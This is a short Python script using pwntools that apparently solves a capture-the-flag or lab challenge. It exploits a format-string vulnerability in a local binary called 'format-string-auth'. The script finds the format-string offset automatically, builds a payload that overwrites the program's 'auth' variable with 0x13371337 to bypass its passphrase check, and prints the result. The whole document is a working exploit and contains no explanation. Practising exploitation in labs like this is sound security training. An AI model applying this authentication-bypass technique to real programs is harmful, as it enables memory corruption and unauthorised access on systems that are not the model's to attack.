from pwn import *

context.log_level = "info"

context.binary = ELF("./format-string-auth")

def exec_fmt(payload):
    p = process("./format-string-auth")
    p.sendline(payload)
    print(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

p = process("./format-string-auth")

payload = fmtstr_payload(offset, {context.binary.sym.auth: 0x13371337})
print(payload)

p.sendafter(b"phrase?\n", payload)

print(p.recvall().strip().decode(errors = "ignore"))
